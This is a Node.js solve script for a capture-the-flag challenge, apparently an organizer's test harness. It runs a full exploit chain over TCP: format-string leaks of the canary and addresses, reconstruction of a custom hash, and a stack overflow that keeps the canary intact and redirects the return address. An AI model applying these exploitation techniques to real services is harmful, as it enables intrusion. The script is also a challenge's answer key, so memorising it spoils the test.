#!/usr/bin/env node
/*
 * CTF 5 — THE LAST GATEKEEPER: SPLIT SEAL
 * PRIVATE verification harness — NOT served by the web server (the static
 * root is frontend/ only) and NOT part of any player package. Kept for
 * organizer/end-to-end testing only, following the same convention as the
 * other challenges in this event (test/ harnesses are never deployed).
 *
 * Implements the intended multi-stage solution against the REAL service:
 *   1. format-string reconnaissance        (identity record)
 *   2. witness reconstruction              (ARX/S-box over the attestation)
 *   3. second format-string disclosure     (continuity note)
 *   4. session-dependent continuation addr (mangled route seal)
 *   5. moving overflow, preserving canary  (recovery memo)
 *
 * Usage: node test/solve.mjs [host] [port]
 *        (defaults: env GATEKEEPER_HOST/GATEKEEPER_PORT or 127.0.0.1:31337)
 */
import net from 'node:net';

const HOST = process.argv[2] || process.env.GATEKEEPER_HOST || '127.0.0.1';
const PORT = Number(process.argv[3] || process.env.GATEKEEPER_PORT || 31337);

const MASK = (1n << 64n) - 1n;
const RC = [
  0x9e3779b97f4a7c15n, 0xd1b54a32d192ed03n, 0x94d049bb133111ebn, 0x2545f4914f6cdd1dn,
  0x369dea0f31a53f85n, 0x8cb92baa2b3d8dd7n, 0x4cf5ad432745937fn, 0x62e8d4a61d6f0c3bn,
];
const S = [
  0x17, 0xa3, 0x6d, 0x4b, 0xd1, 0x28, 0x9c, 0xe7, 0x35, 0x81, 0x5f, 0xc2, 0x0e, 0xf9, 0x73, 0x46,
  0xb8, 0x19, 0xde, 0x52, 0x64, 0xaf, 0x0b, 0x3c, 0x95, 0x27, 0xca, 0x58, 0xf0, 0x6a, 0x41, 0xbd,
];

function rol(x, r) {
  const rb = BigInt(r);
  return ((x << rb) | (x >> (64n - rb))) & MASK;
}

function mix(x, n) {
  for (let i = 0; i < 8; i++) {
    const idx = Number((n >> BigInt((i & 7) * 8)) & 31n);
    x ^= (BigInt(S[idx]) << BigInt((i & 7) * 8)) & MASK;
    x = (x + (RC[i] ^ rol(n, (i * 7 + 3) & 63))) & MASK;
    x = rol(x, (S[(i * 3) & 31] & 31) | 1);
    x ^= x >> BigInt((i % 5) + 11);
    x &= MASK;
  }
  x ^= rol(n ^ 0xa5c39f17d2e46b81n, 23);
  x = (x * 0x9ddfea08eb382d69n) & MASK;
  return (x ^ (x >> 29n)) & MASK;
}

function expectedWitness(challenge, nonce) {
  let x = mix(challenge ^ 0xf00dbabe12345678n, rol(nonce, 17) ^ 0x8a5cd789e3f11245n);
  x ^= rol(challenge, 9);
  x = (x + 0x517cc1b727220a95n) & MASK;
  return (x ^ (x >> 31n)) & MASK;
}

function p64(v) {
  const b = Buffer.alloc(8);
  b.writeBigUInt64LE(v & MASK);
  return b;
}

/* ---------------------------------------------------------------- socket */
let sock = null;
let rx = '';

function wait(marker, timeoutMs = 20000) {
  return new Promise((resolve, reject) => {
    const check = () => {
      const i = rx.indexOf(marker);
      if (i >= 0) {
        clearTimeout(timer);
        sock.off('data', onData);
        resolve();
        return true;
      }
      return false;
    };
    const onData = () => { check(); };
    const timer = setTimeout(() => {
      sock.off('data', onData);
      reject(new Error(`timeout waiting for ${JSON.stringify(marker)}; tail=${JSON.stringify(rx.slice(-240))}`));
    }, timeoutMs);
    sock.on('data', onData);
    if (!check() && sock.destroyed) {
      clearTimeout(timer);
      reject(new Error('connection closed while waiting'));
    }
  });
}

function send(data) {
  sock.write(data);
}

async function main() {
  sock = net.connect({ host: HOST, port: PORT });
  sock.setEncoding('utf8');
  // permanent accumulator — wait() reads this shared buffer
  sock.on('data', (chunk) => { rx += chunk; });
  await new Promise((res, rej) => {
    sock.once('connect', res);
    sock.once('error', rej);
  });

  /* ---- stage 1: format-string reconnaissance ---- */
  await wait('Archivist identification: ');
  send('%55$p|%61$p\n');
  await wait('witness response (16 hex): ');

  const first = rx;
  const leakSlice = first.split('[gatekeeper] identity record:\n')[1]?.split('\n[gatekeeper] session fragment')[0];
  const leaks = (leakSlice || '').match(/0x[0-9a-f]+/g) || [];
  if (leaks.length !== 2) throw new Error(`unexpected first leak layout: ${JSON.stringify(leakSlice)}`);
  const canary = BigInt(leaks[0]);
  const callerIp = BigInt(leaks[1]);

  const sf = (first.match(/session fragment: ([0-9a-f]{16})/) || [])[1];
  const ch = (first.match(/attestation fragment: ([0-9a-f]{16})/) || [])[1];
  if (!sf || !ch) throw new Error('missing session/attestation fragment');
  const sessionFrag = BigInt('0x' + sf);
  const challenge = BigInt('0x' + ch);

  /* ---- stage 2: witness reconstruction ---- */
  const nonce = sessionFrag ^ callerIp ^ 0x6d61726b65725f34n;
  const witness = expectedWitness(challenge, nonce);
  send(witness.toString(16).padStart(16, '0') + '\n');

  await wait('continuity note: ');
  if (!rx.includes('[gatekeeper] witness accepted.')) {
    throw new Error('witness rejected — witness implementation mismatch');
  }

  /* ---- stage 3: second disclosure ---- */
  send('%7$p\n');
  await wait('Recovery memo: ');

  const second = rx.slice(rx.indexOf('continuity note:'));
  const leak2 = second.match(/0x[0-9a-f]+/);
  if (!leak2) throw new Error('second leak missing');
  const routeSeal = BigInt(leak2[0]);

  /* ---- stage 4+5: continuation address + moving overflow ---- */
  const cookie = nonce ^ 0x2f6e0a1b4c5d7e81n;
  const selector = (cookie ^ witness) & 7n;
  const target = routeSeal ^ cookie ^ rol(selector & 7n, 17);
  const shift = Number(((witness ^ nonce) >> 9n) & 7n) * 8;
  const pad = 200 - shift;

  const payload = Buffer.alloc(pad, 0x41);
  payload.writeBigUInt64LE(witness & MASK, 0);
  payload.writeBigUInt64LE((~nonce) & MASK, 8);
  const tail = Buffer.concat([p64(canary), Buffer.alloc(40, 0x42), p64(target)]);
  send(Buffer.concat([payload, tail])); // single write — one read() on the far side

  /* ---- collect the outcome ---- */
  await new Promise((resolve) => {
    const finish = setTimeout(resolve, 6000);
    sock.on('data', () => {
      if (rx.includes('FLAG: RZ{') || /ROUTE AUTHENTICATED/.test(rx)) {
        clearTimeout(finish);
        setTimeout(resolve, 300);
      }
    });
    sock.on('close', () => { clearTimeout(finish); resolve(); });
    sock.on('error', () => { clearTimeout(finish); resolve(); });
  });

  const m = rx.match(/FLAG: (RZ\{[A-Za-z0-9_-]{6,64}\})/);
  if (!m) {
    console.error('FAIL — no flag in output. Tail:');
    console.error(rx.slice(-600));
    process.exit(1);
  }
  console.log('SOLVED:', m[1]);
  process.exit(0);
}

main().catch((err) => {
  console.error('FAIL —', err.message);
  process.exit(1);
});
